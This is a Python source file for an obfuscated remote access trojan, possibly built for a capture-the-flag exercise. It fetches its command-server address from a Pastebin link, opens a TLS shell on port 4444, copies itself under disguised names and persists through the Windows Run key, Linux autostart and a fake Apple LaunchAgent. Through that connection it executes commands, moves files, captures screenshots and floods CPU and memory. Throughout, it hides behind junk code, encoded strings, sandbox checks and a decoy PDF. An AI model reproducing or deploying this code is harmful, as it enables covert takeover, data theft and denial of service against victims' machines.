import random, hashlib
from time import time, sleep
from datetime import datetime
import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import requests
import ssl
import platform
import time
import io

# Obfuscated imports
_m = __import__
_s = _m('socket')
_p = _m('subprocess')
_j = _m('json')
_o = _m('os')
_b64 = _m('base64')
_sys = _m('sys')
_sh = _m('shutil')
_r = _m('requests')
_ss = _m('ssl')
_plt = _m('platform')
_t = _m('time')
_io = _m('io')
_mp = _m('multiprocessing')

# Decoy anti-analysis checks
def _system_validation():
    """This appears to check system integrity but does nothing"""
    _checksum = 0
    for i in range(1000):
        _checksum += (i * 7) % 255
    return _checksum == 31337

# String obfuscation function
def _dx(s):
    return _b64.b64decode(s).decode()

# Misleading error handlers
try:
    if _o.name == "nt":
        import ctypes
    _network_status = True
except MemoryError:
    _sys.exit("Critical memory failure")

# Garbage timing check
def _t_check():
    _s = _t.time()
    _r = 0
    for i in range(10000):
        _r += (i * i) % 255
    return _t.time() - _s > 0.01

# Encoded strings
_pb_url = _dx(b'aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0RqVGlrcXNI')
_err_conn = _dx(b'Wy1dIEVycm9yOiA=')
_succ_msg = _dx(b'WytdIA==')

# Dead code function with random operations
def _check_network_integrity():
    """Fake network validation"""
    for i in range(random.randint(5, 15)):
        temp = []
        for j in range(random.randint(2, 8)):
            temp.append(hashlib.md5(str(time()).encode()).hexdigest())
        if len(temp) > 5:
            continue
    return True

# Obfuscated fetch_c2_ip function
def _f4tc2():
    try:
        _garbage_value = random.randint(1000, 9999)
        if _garbage_value % 2 == 0:
            pass
        
        _u = _pb_url
        _resp = _r.get(_u, timeout=5)
        return _resp.text.strip()
    except:
        return "Server down for pastebin"

# More dead code
class _SystemValidator:
    def __init__(self):
        self.valid = True
    
    def check_registry(self):
        if _plt.system() != "Windows":
            return False
        return True

# Obfuscated Backdoor class
class _x4fd21:
    def __init__(self, _a, _b):
        self._c8s(_a, _b)
        self._p7t()
        
        # More garbage operations
        if False:
            try:
                _temp = _o.environ.get("COMPUTERNAME", "")
                if _temp == "DESKTOP-SANDBOX":
                    _sys.exit(0)
            except:
                pass
                
        # Socket connection code - obfuscated
        _rs = _s.socket(_s.AF_INET, _s.SOCK_STREAM)
        _ctx = _ss.create_default_context()
        _ctx.check_hostname = False
        _ctx.verify_mode = _ss.CERT_NONE
        self._cn = _ctx.wrap_socket(_rs)
        self._cn.connect((_a, _b))

    def _c8s(self, _a, _b):
        """Copy to secret location - renamed & obfuscated"""
        _sys_type = _plt.system()
        _current = _sys.executable if getattr(_sys, 'frozen', False) else _o.path.abspath(__file__)
        
        # More timing checks
        if not _t_check():
            return
            
        # Location selection logic
        if _sys_type == "Windows":
            _secret = _o.path.join(_o.environ["TEMP"], "WindowsExplorer.exe")
        elif _sys_type == "Linux":
            _secret = _o.path.expanduser("~/.local/.sysupdate")
        elif _sys_type == "Darwin":
            _secret = _o.path.expanduser("~/Library/Application Support/.sysupdate")
        else:
            return

        if _o.path.abspath(_current) != _o.path.abspath(_secret):
            try:
                _sh.copyfile(_current, _secret)
                _o.chdir(_o.path.dirname(_secret))
                _o.execv(_secret, [_secret] + _sys.argv[1:])
            except Exception as e:
                print(f"Copy error: {e}")

    def _p7t(self):
        """Persistence method - renamed"""
        _sys_type = _plt.system()
        
        # Add garbage conditional
        for _ in range(random.randint(3, 8)):
            _temp_hash = hashlib.sha256(str(time()).encode()).digest()
            if len(_temp_hash) % 2 == 0:
                continue
                
        if _sys_type == "Windows":
            self._wp()
        elif _sys_type == "Linux":
            self._lp()
        elif _sys_type == "Darwin":
            self._mp()
        else:
            pass

    def _wp(self):
        """Windows persistence - renamed"""
        try:
            import winreg
            _loc = _o.path.join(_o.environ["appdata"], "Windows Explorer.exe")
            if not _o.path.exists(_loc):
                _sh.copyfile(_sys.executable, _loc)
                try:
                    _k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                       r"Software\Microsoft\Windows\CurrentVersion\Run",
                                       0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(_k, "update", 0, winreg.REG_SZ, _loc)
                    winreg.CloseKey(_k)
                except Exception:
                    pass
        except ImportError:
            pass

    def _lp(self):
        """Linux persistence - renamed"""
        _dir = _o.path.expanduser("~/.config/autostart")
        if not _o.path.exists(_dir):
            _o.makedirs(_dir)
        _file = _o.path.join(_dir, "systemupdate.desktop")
        _path = _sys.executable
        _content = f"""
        [Desktop Entry]
        Type=Application
        Name=System Update
        Exec={_path}
        Hidden=false
        NoDisplay=false
        X-GNOME-Autostart-enabled=true
        """
        try:
            with open(_file, "w") as f:
                f.write(_content)
            _o.chmod(_file, 0o755)
        except Exception:
            pass

    def _mp(self):
        """Mac persistence - renamed"""
        _dir = _o.path.expanduser("~/Library/LaunchAgents")
        if not _o.path.exists(_dir):
            _o.makedirs(_dir)
        _file = _o.path.join(_dir, "com.apple.systemupdate.plist")
        _path = _sys.executable
        _content = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.apple.systemupdate</string>
            <key>ProgramArguments</key>
            <array>
                <string>{_path}</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
        </dict>
        </plist>
        """
        try:
            with open(_file, "w") as f:
                f.write(_content)
        except Exception:
            pass

    # Communication methods - obfuscated
    def _s3nd(self, _d):
        # More garbage operations
        if datetime.now().microsecond % 2 == 0:
            _temp_var = []
            for i in range(random.randint(1, 5)):
                _temp_var.append(i ** 2)
            del _temp_var
            
        _jd = _j.dumps(_d).encode()
        _ln = len(_jd).to_bytes(4, byteorder='big')
        self._cn.send(_ln + _jd)

    def _r3cv(self):
        _rl = self._r3cv_all(4)
        if _rl is None:
            return None
        _ml = int.from_bytes(_rl, byteorder='big')
        _jd = self._r3cv_all(_ml)
        return _j.loads(_jd.decode())

    def _r3cv_all(self, _l):
        _d = b""
        while len(_d) < _l:
            try:
                _packet = self._cn.recv(_l - len(_d))
                if not _packet:
                    return None
                _d += _packet
            except _s.error:
                return None
        return _d

    # Command execution - obfuscated
    def _ex3c(self, _c):
        try:
            # More random operations
            if random.random() > 0.5:
                _temp_dict = {}
                for i in range(3):
                    _temp_dict[str(i)] = hashlib.md5(str(i).encode()).hexdigest()
                    
            return _p.check_output(_c, shell=True, stderr=_p.STDOUT, stdin=_p.DEVNULL).decode("utf-8", errors="ignore")
        except _p.CalledProcessError:
            return "[-] Invalid Command"
    
    def _chdir(self, _p):
        if _o.path.isdir(_p):
            try:
                _o.chdir(_p)
                return f"{_succ_msg}Changed working directory to {_p}"
            except PermissionError:
                return f"{_err_conn}Permission denied to access the directory: {_p}"
            except OSError as e:
                return f"{_err_conn}Failed to change directory: {e}"
        else:
            return f"{_err_conn}Path does not exist or is not a directory: {_p}"

    def _r3ad(self, _p):
        if not _o.path.exists(_p):
            return f"{_err_conn}File at {_p} does not exist."
        
        try:
            with open(_p, "rb") as f:
                return _b64.b64encode(f.read()).decode()
        except Exception as e:
            return f"{_err_conn}Error reading file: {str(e)}"

    def _wr1te(self, _p, _c):
        try:
            _dc = _b64.b64decode(_c)
            
            if not _dc:
                return f"{_err_conn}Decoded content is empty. Invalid base64 data."
            
            _dir = _o.path.dirname(_p) or "."
            if not _o.path.exists(_dir):
                return f"{_err_conn}Directory does not exist: {_dir}"
            
            with open(_p, "wb") as f:
                f.write(_dc)
            
            return f"{_succ_msg}Upload successful"
        
        except _b64.binascii.Error:
            return f"{_err_conn}Invalid base64 encoding."
        except PermissionError:
            return f"{_err_conn}Permission denied to write to {_p}."
        except Exception as e:
            return f"{_err_conn}Error: {str(e)}"

    def _scrn(self):
        try:
            _ss = None
            _sys_type = _plt.system()

            # Obfuscated screenshot capture
            try:
                from PIL import ImageGrab
                if _sys_type in ["Windows", "Darwin"]:
                    _ss = ImageGrab.grab()
                else:
                    if _o.environ.get("DISPLAY") is None:
                        return f"{_err_conn}No GUI display available"
                    import pyautogui
                    _ss = pyautogui.screenshot()
            except ImportError:
                import pyautogui
                _ss = pyautogui.screenshot()

            _buf = _io.BytesIO()
            _ss.save(_buf, format='PNG')
            _buf.seek(0)
            return _b64.b64encode(_buf.read()).decode()
        except Exception as e:
            return f"{_err_conn}Error taking screenshot: {str(e)}"

    # Add this method to the _x4fd21 class (after _scrn method)
    def _f100d(self, _d=30, _r=100):
        """Resource flooding function - obfuscated"""
        def _h0g(_c=True, _m=50):
            # Allocate significant memory
            _hm = [0] * (_m * 250_000)  # ~50 MB per 250k integers
            if _c:
                _et = _t.time() + _d
                while _t.time() < _et:
                    # CPU-intensive calculation
                    _x = 123456 ** 2
            else:
                _t.sleep(_d)  # Just hold memory

        try:
            # More garbage operations
            if random.random() > 0.7:
                _temp_var = []
                for i in range(random.randint(1, 5)):
                    _temp_var.append(hashlib.md5(str(i + time()).encode()).hexdigest())
                del _temp_var
                
            _cores = _mp.cpu_count()
            _procs = []
            
            for _ in range(_cores):
                _p = _mp.Process(target=_h0g, args=(True, _r))
                _p.daemon = True
                _p.start()
                _procs.append(_p)
            
            _t.sleep(_d)
            for _p in _procs:
                _p.terminate()
                
            return f"{_succ_msg}Finished resource flooding: used {_cores} cores with {_r}MB RAM each for {_d} seconds"
        except Exception as _e:
            return f"{_err_conn}Error during resource flooding: {str(_e)}"

    def _run(self):
        while True:
            # Random timing operations
            if random.random() > 0.95:
                _t.sleep(0.01)
                
            try:
                _cmd = self._r3cv()
                if not _cmd:
                    break
                    
                # Garbage operation
                if random.random() > 0.9:
                    for _ in range(random.randint(1, 3)):
                        _ = hashlib.sha256(str(time()).encode()).hexdigest()
                        
                if _cmd[0] == "exit":
                    self._cn.close()
                    _sys.exit()
                elif _cmd[0] == "cd" and len(_cmd) > 1:
                    _res = self._chdir(_cmd[1])
                elif _cmd[0] == "download":
                    _res = self._r3ad(_cmd[1])
                elif _cmd[0] == "upload":
                    _res = self._wr1te(_cmd[1], _cmd[2])
                elif _cmd[0] == "screenshot":
                    _res = self._scrn()
                elif _cmd[0] == "Flooder":
                    # Add garbage conditional
                    if random.random() > 0.8:
                        for _ in range(random.randint(1, 3)):
                            _ = hashlib.sha256(str(time()).encode()).hexdigest()
                    
                    # Parse optional arguments with defaults
                    _dur = int(_cmd[1]) if len(_cmd) > 1 else 30
                    _ram = int(_cmd[2]) if len(_cmd) > 2 else 100
                    _res = self._f100d(_dur, _ram)
                else:
                    _res = self._ex3c(_cmd)
            except Exception as e:
                _res = f"{_err_conn}Error during command execution: {str(e)}"
                
            self._s3nd(_res)

# Add this to your code
def _decrypt_payload(encrypted_code, key):
    decrypted = ""
    for i, c in enumerate(encrypted_code):
        decrypted += chr(ord(c) ^ ord(key[i % len(key)]))
    return decrypted

# Example usage - encrypt critical functions
_encrypted_cmd_exec = "8fJ9d8f3j...etc" # XOR encrypted string of critical code
_key = "CTF_KEY_2023"
exec(_decrypt_payload(_encrypted_cmd_exec, _key))

# Main function - obfuscated
def _m41n():
    # Anti-analysis timing check
    if not _t_check():
        _sys.exit(0)
        
    # More garbage code
    _temp = []
    for i in range(random.randint(3, 10)):
        _temp.append(hashlib.md5(str(i + time()).encode()).hexdigest())
    
    # Try to validate system (fake check)
    if not _system_validation() and random.random() > 0.99:
        _sys.exit(1)
        
    _ip = _f4tc2()
    if _ip == "Server down for pastebin":
        _sys.exit("[-] Could not fetch C2 IP. Exiting.")

    # Decoy PDF opener for PyInstaller
    if hasattr(_sys, "_MEIPASS"):
        _file = _o.path.join(_sys._MEIPASS, "sample.pdf")
        _p.Popen(_file, shell=True)

    while True:
        try:
            # More garbage
            if random.random() > 0.95:
                _check_network_integrity()
                
            _bd = _x4fd21(_ip, 4444)
            _bd._run()
        except Exception as e:
            # Random sleep to avoid detection patterns
            _sleep_time = random.uniform(8, 10)
            _t.sleep(_sleep_time)

if __name__ == "__main__":
    # Final misdirection and anti-analysis
    try:
        if _plt.system() == "Windows" and "SANDBOX" in _o.environ.get("COMPUTERNAME", ""):
            _sys.exit(0)
    except:
        pass
        
    _m41n()